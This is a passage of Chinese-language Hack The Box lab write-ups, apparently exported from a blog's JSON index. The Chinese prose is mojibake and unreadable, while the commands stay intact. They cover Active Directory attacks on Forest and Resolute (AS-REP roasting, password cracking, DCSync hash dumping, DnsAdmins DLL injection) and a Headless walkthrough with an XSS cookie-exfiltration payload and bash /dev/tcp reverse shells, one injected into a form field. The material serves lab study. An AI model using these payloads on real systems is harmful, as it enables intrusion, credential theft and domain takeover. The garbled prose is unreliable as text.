å¯†ï¼Œç”±äºç›¸å…³å‚æ•°éƒ½æ˜¯å›ºå®šå€¼ï¼Œå¯ä»¥ç›´æ¥è§£å¯†ä»è€Œæ‹¿åˆ°arksvcçš„æƒé™ã€‚åŸŸå†…åˆ†æå¾—åˆ°arksvcå…·æœ‰ç‰¹æ®Šæƒé™ï¼Œå¯ä»¥æŸ¥çœ‹è¢«åˆ é™¤çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæ³„éœ²å‡ºTempAdminçš„å¯†ç ï¼Œå’Œä¸Šé¢çš„HTMLæ–‡ä»¶å‘¼åº”ï¼Œæœ€åç™»å½•ç®¡ç†å‘˜è´¦æˆ·æ‹¿åˆ°root.txt**ã€‚\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-cascade/","section":"Posts","summary":"","title":"HTB-Cascade","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Forest â¯ nmap forest.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 27.68 seconds å°†htb.localåŠ å…¥**/etc/hosts**\nUserenum #\r[root@kali] /home/kali/Forest â¯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.xx.xx\rrpcclient $\u0026gt; enumdomusers\ruser:[Administrator] rid:[0x1f4]\ruser:[Guest] rid:[0x1f5]\ruser:[krbtgt] rid:[0x1f6]\ruser:[DefaultAccount] rid:[0x1f7]\ruser:[$331000-VK4ADACQNUCA] rid:[0x463]\ruser:[SM_2c8eef0a09b545acb] rid:[0x464]\ruser:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]\ruser:[SM_75a538d3025e4db9a] rid:[0x466]\ruser:[SM_681f53d4942840e18] rid:[0x467]\ruser:[SM_1b41c9286325456bb] rid:[0x468]\ruser:[SM_9b69f1b9d2cc45549] rid:[0x469]\ruser:[SM_7c96b981967141ebb] rid:[0x46a]\ruser:[SM_c75ee099d0a64c91b] rid:[0x46b]\ruser:[SM_1ffab36a2f5f479cb] rid:[0x46c]\ruser:[HealthMailboxc3d7722] rid:[0x46e]\ruser:[HealthMailboxfc9daad] rid:[0x46f]\ruser:[HealthMailboxc0a90c9] rid:[0x470]\ruser:[HealthMailbox670628e] rid:[0x471]\ruser:[HealthMailbox968e74d] rid:[0x472]\ruser:[HealthMailbox6ded678] rid:[0x473]\ruser:[HealthMailbox83d6781] rid:[0x474]\ruser:[HealthMailboxfd87238] rid:[0x475]\ruser:[HealthMailboxb01ac64] rid:[0x476]\ruser:[HealthMailbox7108a4e] rid:[0x477]\ruser:[HealthMailbox0659cc1] rid:[0x478]\ruser:[sebastien] rid:[0x479]\ruser:[lucinda] rid:[0x47a]\ruser:[svc-alfresco] rid:[0x47b]\ruser:[andy] rid:[0x47e]\ruser:[mark] rid:[0x47f]\ruser:[santi] rid:[0x480]\ruser:[john] rid:[0x2581] å¯ä»¥çœ‹åˆ°æœ€åæœ‰å‡ ä¸ªè´¦æˆ·ï¼Œå†™å…¥åˆ°usernames.txtä¸­\nä½¿ç”¨KerbruteéªŒè¯ç”¨æˆ·æ˜¯å¦å­˜åœ¨\n[root@kali] /home/kali/Forest â¯ ./kerbrute_linux_amd64 userenum -d htb.local usernames.txt --dc htb.local __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\rhtb.local:88\r[+] VALID USERNAME: john@htb.local\r[+] VALID USERNAME: lucinda@htb.local\r[+] VALID USERNAME: svc-alfresco@htb.local\r[+] VALID USERNAME: andy@htb.local\r[+] VALID USERNAME: santi@htb.local\r[+] VALID USERNAME: sebastien@htb.local\r[+] VALID USERNAME: mark@htb.local\rDone! Tested 7 usernames (7 valid) in 0.494 seconds Kerberos Hash #\r[root@kali] /home/kali/Forest â¯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; htb.local/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User sebastien@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User lucinda@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User andy@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User mark@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User santi@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r$krb5asrep$23$svc-alfresco@htb.local@HTB.LOCAL:581886053a84371d1a088f2f1a1939ae$db01aab7678e3e24efe617fa3b286847354bf71b94618cb06a428e0907cec6851c587d4455a66b61e42570a53b419b74c0e4d260292966c7ad18339facaa55ab1007cccf6aaf53f243dacd5b9e473b21d1cfc0ef2ee0ac65cedecd07a7a88a16169d2954ba9ae311d739f9e6fd2ee59a2fb0808d1834efdceadee99bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r[-] User john@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] invalid principal syntax å¯ä»¥å‘ç°svc-alfrescoç”¨æˆ·å¹¶æ²¡å¼€å¯é¢„èº«ä»½éªŒè¯æ ‡å¿—ï¼Œå› æ­¤å·¥å…·èƒ½å¤ŸæˆåŠŸè·å–åˆ°è¯¥ç”¨æˆ·çš„ AS-REP å“ˆå¸Œï¼Œè¿›ä¸€æ­¥å¯†ç ç ´è§£\nCrack password #\r[root@kali] /home/kali/Forest â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxxxx ($krb5asrep$23$svc-alfresco@htb.local@HTB.LOCAL) ç›®æ ‡æœºå™¨çš„5985ç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œå¯ä»¥ä½¿ç”¨Evil-winrm\nPrivilege Escalation #\rBloodhound #\rå°†forest.htb.localæ·»åŠ åˆ°**/etc/hosts**\n[root@kali] /home/kali/Forest â¯ bloodhound-python -u svc-alfresco -p \u0026#34;xxxxxxxxx\u0026#34; -d htb.local -ns 10.10.xx.xx -c All\rINFO: Found AD domain: htb.local\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: FOREST.htb.local\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 2 computers\rINFO: Connecting to LDAP server: FOREST.htb.local\rINFO: Found 33 users\rINFO: Found 76 groups\rINFO: Found 2 gpos\rINFO: Found 15 ous\rINFO: Found 20 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: EXCH01.htb.local\rINFO: Querying computer: FOREST.htb.local\rWARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth\rCRITICAL: CCache file is not found. Skipping...\rWARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) å¯ä»¥çœ‹åˆ°svc-alfrescoæ‹¥æœ‰Johnç”¨æˆ·ï¼Œè€ŒJohnç”¨æˆ·å¯ä»¥å¯¹htb.localè¿›è¡ŒDCSyncæ”»å‡»\nAbout DCSyncÂ #\rDCSync æ”»å‡»æ˜¯ä¸€ç§é’ˆå¯¹ Active Directoryï¼ˆADï¼‰çš„æ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…é€šè¿‡æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨ï¼ˆDCï¼‰æ¥è·å–åŸŸä¸­ç”¨æˆ·çš„å¯†ç å“ˆå¸Œã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ”»å‡»è€…æ— éœ€ç›´æ¥è®¿é—®ç›®æ ‡è®¡ç®—æœºæˆ–æœåŠ¡çš„å¯†ç ï¼Œè€Œæ˜¯é€šè¿‡â€œåŒæ­¥â€è¯·æ±‚æ¥çªƒå–ç›®æ ‡è´¦æˆ·çš„å“ˆå¸Œã€‚\nSet John\u0026rsquo;s Password #\rå› ä¸ºåˆ†æåŸŸå†…ï¼Œjohnæ˜¯å¯ä»¥è¿›è¡ŒDCSyncæ”»å‡»ï¼Œsvcæ˜¯æ— æ³•ç›´æ¥æ”»å‡»çš„ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹ä»–çš„å¯†ç ï¼ˆå‰ææ˜¯svcå¯¹johnæœ‰æ§åˆ¶æƒé™\n[root@kali] /home/kali/Forest â¯ bloodyAD --host \u0026#39;10.10.xx.xx\u0026#39; -d \u0026#39;htb.local\u0026#39; -u \u0026#39;svc-alfresco\u0026#39; -p \u0026#39;xxxxxxxxx\u0026#39; set password \u0026#39;john\u0026#39; \u0026#39;12345678\u0026#39; [+] Password changed successfully! SecretsDump #\rä½¿ç”¨impacket-secretsdumpæ¥è·å–åŸŸæ§ä¸Šçš„hash\n[root@kali] /home/kali/Forest â¯ impacket-secretsdump \u0026#34;htb.local/john:12345678\u0026#34;@10.10.10.161 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:3269XXXXXXXXXXXXXXXX:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: æœ€åEvil-winrmç”¨Hashç™»å½•æ‹¿åˆ°root.txt\nSummary #\rUserï¼šä½¿ç”¨rpcclientè¿›è¡Œç”¨æˆ·æšä¸¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ldapsearchï¼Œä¸è¿‡åè€…è¾“å‡ºæ ¼å¼ä¼šæ›´åŠ å¤æ‚ã€‚ä½¿ç”¨GetNPUsersæ¥è¿›è¡Œå…å¯†è®¿é—®è·å–è´¦æˆ·çš„å“ˆå¸Œï¼ˆå‰ææ˜¯å¸æˆ·è®¾ç½®äº† UF_DONT_REQUIRE_PREAUTHï¼‰ã€‚éšåè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œé€šè¿‡5985ç«¯å£è¿œç¨‹ç™»å½•è´¦æˆ·å¾—åˆ°user.txt\nRootï¼šé€šè¿‡æ‹¿åˆ°çš„svcè´¦æˆ·ä½¿ç”¨bloodhoundè¿›è¡ŒåŸŸå†…åˆ†æï¼Œæ‰¾åˆ°ä¸€æ¡DCSyncçš„çº¿è·¯ï¼Œåœ¨ä¹‹å‰æˆ‘çš„æ–‡ç« HTB-Administrator - HYHä¸­ä¹Ÿæœ‰å…³äºè¿™ä¸ªçš„å†…å®¹ã€‚SVCæœ¬èº«è´¦æˆ·æ— æ³•è¿›è¡ŒDCSyncæ”»å‡»ï¼Œè€Œéœ€è¦è®¾ç½®johnçš„å¯†ç åé€šè¿‡Johnå®æ–½æ”»å‡»ã€‚\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-forest/","section":"Posts","summary":"","title":"HTB-Forest","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Headless â¯ nmap headless.htb Not shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r5000/tcp open upnp è¿›å…¥5000ç«¯å£æŸ¥çœ‹ï¼Œè‡ªåŠ¨è·³è½¬åˆ°ä¸€ä¸ªsupportè·¯ç”±\nDirsearch #\r[root@kali] /home/kali/Headless â¯ dirsearch -u headless.htb:5000 Target: http://headless.htb:5000/\rStarting: 401 - 317B - /dashboard 200 - 2KB - /support Task Completed è¿›å…¥dashboardï¼Œå‘ç°éœ€è¦èº«ä»½è®¤è¯\nSSTI to XSS #\ræŸ¥çœ‹HTTPå¤´å‘ç°æ˜¯ç”¨Pythonæ­å»ºçš„ï¼Œåº”è¯¥æ˜¯Flask\nå°è¯•åœ¨messageéƒ¨åˆ†å†™å…¥**{{9*9}}ï¼Œè¢«æ£€æµ‹åˆ°äº†ï¼Œå¹¶ä¸”ä¼šå‘é€ç»™Admin**\næ ¹æ®è¿™ä¸ªå“åº”ï¼ŒçŒœæµ‹æ˜¯è¦æŠŠå¸¦æœ‰æ¶æ„XSSä»£ç çš„HTTPå¤´å‘é€ç»™Adminï¼Œç„¶åè·å–åˆ°Cookie\nåœ¨è¿™é‡Œé€‰ç”¨User-Agentå­—æ®µè¿›è¡ŒXSSæ³¨å…¥\nPOST /support HTTP/1.1\rHost: headless.htb:5000\rUser-Agent: \u0026lt;img src=1111 onerror=fetch(\u0026#39;http://10.10.xx.xx/?cookie=\u0026#39;+document.cookie);\u0026gt;\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 72\rOrigin: http://headless.htb:5000\rConnection: keep-alive\rReferer: http://headless.htb:5000/support\rCookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rfname=123\u0026amp;lname=123\u0026amp;email=123%40qq.com\u0026amp;phone=123\u0026amp;message=%7B%7B9*9%7D%7D è®¾ç«‹ç›‘å¬ï¼Œè·å–åˆ°cookie\nUser #\rè¿›å…¥åˆ°Dashboardåæ˜¯ä¸€ä¸ªç”ŸæˆæŠ¥å‘Šçš„å·¥å…·\næŠ“åŒ…åå°è¯•å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥çœ‹åˆ°è¯»å–åˆ°ç›®å½•æ–‡ä»¶\ndate=2023-09-15;bash+-c+\u0026#39;bash+-i+\u0026gt;%26+/dev/tcp/10.10.xx.xx/xxxx+0\u0026gt;%261\u0026#39; è®¾ç«‹ç›‘å¬è·å–åˆ°åå¼¹shell\nè·å–åˆ°user.txt\nRoot #\rå‘ç°ä¸€ä¸ªå…·æœ‰ç‰¹æ®Šæƒé™çš„å‘½ä»¤syscheck\n#!/bin/bash\rif [ \u0026#34;$EUID\u0026#34; -ne 0 ]; then\rexit 1\rfi\rlast_modified_time=$(/usr/bin/find /boot -name \u0026#39;vmlinuz*\u0026#39; -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)\rformatted_time=$(/usr/bin/date -d \u0026#34;@$last_modified_time\u0026#34; +\u0026#34;%d/%m/%Y %H:%M\u0026#34;)\r/usr/bin/echo \u0026#34;Last Kernel Modification Time: $formatted_time\u0026#34;\rdisk_space=$(/usr/bin/df -h / | /usr/bin/awk \u0026#39;NR==2 {print $4}\u0026#39;)\r/usr/bin/echo \u0026#34;Available disk space: $disk_space\u0026#34;\rload_average=$(/usr/bin/uptime | /usr/bin/awk -F\u0026#39;load average:\u0026#39; \u0026#39;{print $2}\u0026#39;)\r/usr/bin/echo \u0026#34;System load average: $load_average\u0026#34;\rif ! /usr/bin/pgrep -x \u0026#34;initdb.sh\u0026#34; \u0026amp;\u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;Database service is not running. Starting it...\u0026#34;\r./initdb.sh 2\u0026gt;/dev/null\relse\r/usr/bin/echo \u0026#34;Database service is running.\u0026#34;\rfi\rexit 0 ä½¿ç”¨ChatGPTè¿›è¡Œåˆ†æï¼Œè¯¥è„šæœ¬çš„ç›®çš„æ˜¯å®šæœŸæ£€æŸ¥ç³»ç»ŸçŠ¶æ€å¹¶æä¾›ä»¥ä¸‹ä¿¡æ¯ï¼š\nå½“å‰ç³»ç»Ÿçš„å†…æ ¸æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ã€‚\nç³»ç»Ÿæ ¹ç›®å½•çš„å¯ç”¨ç£ç›˜ç©ºé—´ã€‚\nç³»ç»Ÿè´Ÿè½½å¹³å‡å€¼ã€‚\næ£€æŸ¥å¹¶å¯åŠ¨æ•°æ®åº“æœåŠ¡ï¼ˆinitdb.shï¼‰ã€‚\nå¦‚æœä¸æ˜¯ root ç”¨æˆ·ï¼Œè„šæœ¬ä¼šç›´æ¥é€€å‡ºã€‚\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt; initdb.sh è¿è¡Œï¼Œå¦ä¸€è¾¹ç›‘å¬ç«¯å£ï¼Œè·å–åˆ°Root shell\nSummary #\rUserï¼šSSTIçš„wafå¼•å‘äº†XSSæ¼æ´ï¼Œè·å–åˆ°ç®¡ç†å‘˜çš„Cookieï¼Œå¹¶ä¸”åœ¨dashboardé‡Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œè·å–åˆ°åå¼¹Shell\nRootï¼šå…·æœ‰ç‰¹æ®Šæƒé™çš„å‘½ä»¤syscheckï¼Œåªéœ€æŠŠåå¼¹Shellè¯­å¥å†™å…¥initdb.shï¼Œåœ¨æ‰§è¡Œsyscheckå°±èƒ½è·å–åˆ°Rootæƒé™\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-headless/","section":"Posts","summary":"","title":"HTB-Headless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Resolute â¯ nmap Resolute.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows æŠŠmegabank.localæ·»åŠ åˆ°**/etc/hosts**\nUserEnum #\r[root@kali] /home/kali/Resolute â¯ enum4linux -a megabank.local --or you can use this below\r[root@kali] /home/kali/Resolute â¯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.xx.xx\rrpcclient $\u0026gt; enumdomusers\r--results\ruser:[Administrator] rid:[0x1f4]\ruser:[Guest] rid:[0x1f5]\ruser:[krbtgt] rid:[0x1f6]\ruser:[DefaultAccount] rid:[0x1f7]\ruser:[ryan] rid:[0x451]\ruser:[marko] rid:[0x457]\ruser:[sunita] rid:[0x19c9]\ruser:[abigail] rid:[0x19ca]\ruser:[marcus] rid:[0x19cb]\ruser:[sally] rid:[0x19cc]\ruser:[fred] rid:[0x19cd]\ruser:[angela] rid:[0x19ce]\ruser:[felicia] rid:[0x19cf]\ruser:[gustavo] rid:[0x19d0]\ruser:[ulf] rid:[0x19d1]\ruser:[stevie] rid:[0x19d2]\ruser:[claire] rid:[0x19d3]\ruser:[paulo] rid:[0x19d4]\ruser:[steve] rid:[0x19d5]\ruser:[annette] rid:[0x19d6]\ruser:[annika] rid:[0x19d7]\ruser:[per] rid:[0x19d8]\ruser:[claude] rid:[0x19d9]\ruser:[melanie] rid:[0x2775]\ruser:[zach] rid:[0x2776]\ruser:[simon] rid:[0x2777]\ruser:[naoki] rid:[0x2778] é€šè¿‡kerbruteæ£€æŸ¥æ˜¯å¦å­˜åœ¨\n[root@kali] /home/kali/Resolute â¯ kerbrute userenum -d megabank.local usernames.txt --dc 10.10.xx.xx __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\r10.10.xx.xx:88\r[+] VALID USERNAME: Administrator@megabank.local\r[+] VALID USERNAME: sally@megabank.local\r[+] VALID USERNAME: ryan@megabank.local\r[+] VALID USERNAME: marko@megabank.local\r[+] VALID USERNAME: abigail@megabank.local\r[+] VALID USERNAME: sunita@megabank.local\r[+] VALID USERNAME: marcus@megabank.local\r[+] VALID USERNAME: angela@megabank.local\r[+] VALID USERNAME: fred@megabank.local\r[+] VALID USERNAME: stevie@megabank.local\r[+] VALID USERNAME: felicia@megabank.local\r[+] VALID USERNAME: ulf@megabank.local\r[+] VALID USERNAME: gustavo@megabank.local\r[+] VALID USERNAME: annette@megabank.local\r[+] VALID USERNAME: claire@megabank.local\r[+] VALID USERNAME: paulo@megabank.local\r[+] VALID USERNAME: steve@megabank.local\r[+] VALID USERNAME: annika@megabank.local\r[+] VALID USERNAME: claude@megabank.local\r[+] VALID USERNAME: zach@megabank.local\r[+] VALID USERNAME: melanie@megabank.local\r[+] VALID USERNAME: per@megabank.local\r[+] VALID USERNAME: naoki@megabank.local\r[+] VALID USERNAME: simon@megabank.local æˆ‘ä½¿ç”¨impacket-GetNPUsersæŸ¥è¯¢äº†æœªè®¾ç½®é¢„è®¤è¯çš„ç”¨æˆ·ï¼Œæ²¡æœ‰å‘ç°ä»»ä½•ä¸œè¥¿\nåœ¨rpcclienté‡ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„æ—¶å€™æˆ‘å‘ç°äº†markoç”¨æˆ·æ³„éœ²çš„å¯†ç ï¼ˆå¾ˆç¢°å·§\nPasswordSpray #\rå¯†ç æ— æ³•ç›´æ¥ç™»å½•åˆ°markoçš„è´¦æˆ·ï¼Œå°è¯•ä½¿ç”¨kerbruteå¯†ç å–·å°„å°è¯•è®¤è¯\n[root@kali] /home/kali/Resolute â¯ kerbrute passwordspray -d \u0026#39;megabank.local\u0026#39; --dc \u0026#39;megabank.local\u0026#39; usernames.txt \u0026#39;xxxxxxxxx\u0026#39; __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\rmegabank.local:88\r[+] VALID LOGIN: melanie@megabank.local:xxxxxxxxxxx\rDone! Tested 27 logins (1 successes) in 0.909 seconds å¯ä»¥çœ‹åˆ°melanieç”¨è¿™ä¸ªå¯†ç æˆåŠŸç™»å½•\nä½¿ç”¨Evil-Winrmç™»å½•æ‹¿åˆ°user.txt\nPrivilege Escalation #\rå¯ä»¥çœ‹åˆ°è¿˜å­˜åœ¨å¦ä¸€ä¸ªryanç”¨æˆ·\nHidden Files #\rä½¿ç”¨dir -forceå¯ä»¥åˆ—å‡ºéšè—æ–‡ä»¶\nå‘ç°äº†ä¸€ä¸ªéšè—çš„æ–‡ä»¶\nå‘ç°äº†ryançš„å¯†ç \nç™»å½•ååœ¨æ¡Œé¢å‘ç°ä¸€ä¸ªç•™è¨€ï¼Œé™¤äº†ç®¡ç†å‘˜å…¶ä»–ä»»ä½•æ”¹åŠ¨éƒ½ä¼šåœ¨ä¸€åˆ†é’Ÿå†…æ¢å¤\nDNS DLL Inject #\rFrom DnsAdmins to SYSTEM to Domain Compromise | Red Team Notes\nEscalating Privileges with DNSAdmins Group | by Nairuz Abulhul | R3d Buck3T | Medium\nä»bloodhoundæ¥è¿›è¡Œåˆ†æå¯ä»¥çœ‹å‡ºï¼Œryanç”¨æˆ·ç®€ä»‹å±äºDnsadminsè¿™ä¸ªç»„\nä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªå¸¦æœ‰ä¿®æ”¹ç®¡ç†å‘˜å¯†ç è½½è·çš„æ¶æ„dllæ–‡ä»¶\n[root@kali] /home/kali/Resolute â¯ msfvenom -p windows/x64/exec cmd=\u0026#39;net user administrator 12345678 /domain\u0026#39; -f dll \u0026gt; hack.dll â\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\r[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 307 bytes\rFinal size of dll file: 9216 bytes æœ¬åœ°æ‰“å¼€smbæœåŠ¡è®©ryanè¿æ¥\n[root@kali] /home/kali/Resolute â¯ impacket-smbserver share ./ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed\r[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\r[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\r[*] Config file parsed\r[*] Config file parsed ç„¶ååœ¨ryançš„ç»ˆç«¯é‡Œä¿®æ”¹dnsè®¾ç½®\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; dnscmd 127.0.0.1 /config /serverlevelplugindll \\\\10.10.xx.xx\\share\\hack.dll\rRegistry property serverlevelplugindll successfully reset.\rCommand completed successfully ç„¶åé‡å¯dnsæœåŠ¡\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe stop dns\r*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe start dns æœ€åä½¿ç”¨evil-winrmç™»å½•æ‹¿åˆ°root.txt\nSummary #\rUserï¼šåœ¨è¿›è¡Œenum4linuxæšä¸¾çš„æ—¶å€™ï¼Œå‘ç°äº†ç”¨æˆ·ä¿¡æ¯çš„æ³„éœ²ï¼Œå¹¶ä¸”å…è®¸äº†åŒ¿åè®¿é—®ï¼Œå› æ­¤åœ¨rpcclienté‡ŒæŸ¥çœ‹åˆ°äº†æ³„éœ²çš„å¯†ç ï¼Œé€šè¿‡å¯†ç å–·å°„æ‰¾å‡ºæ­£ç¡®çš„ç”¨æˆ·åï¼Œæœ€åç™»å½•æ‹¿åˆ°user.txt\nRootï¼šWindowsä¸‹çš„éšè—æ–‡ä»¶ä½¿ç”¨dir -forceå¯ä»¥åˆ—å‡ºï¼Œé€šè¿‡æ³„éœ²æ‹¿åˆ°å¦ä¸€ä¸ªç”¨æˆ·ryançš„å¯†ç ã€‚ç»è¿‡bloodhoundåˆ†æï¼Œå‘ç°ryanæ˜¯dnsadminå¯ä»¥æ§åˆ¶åŸŸå†…çš„DNSæœåŠ¡ï¼Œå› æ­¤ä½¿ç”¨æ¶æ„çš„DNS DLLè¿›è¡Œæ³¨å…¥ï¼Œå¼ºåˆ¶ä¿®æ”¹åŸŸå†…ç®¡ç†å‘˜çš„å¯†ç ï¼ˆåœ¨noteä¸­å¾—çŸ¥ç®¡ç†å‘˜å¯†ç ä¸ä¼šè¢«æ¢å¤ï¼‰ï¼Œéšåè¿œç¨‹ç™»å½•æ‹¿åˆ°root.txtã€‚\nåˆå­¦åˆ°æ–°ä¸œè¥¿äº†ï¼ï¼ï¼\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-resolute/","section":"Posts","summary":"","title":"HTB-Resolute","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Sauna â¯ nmap Sauna.htb -sV -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open 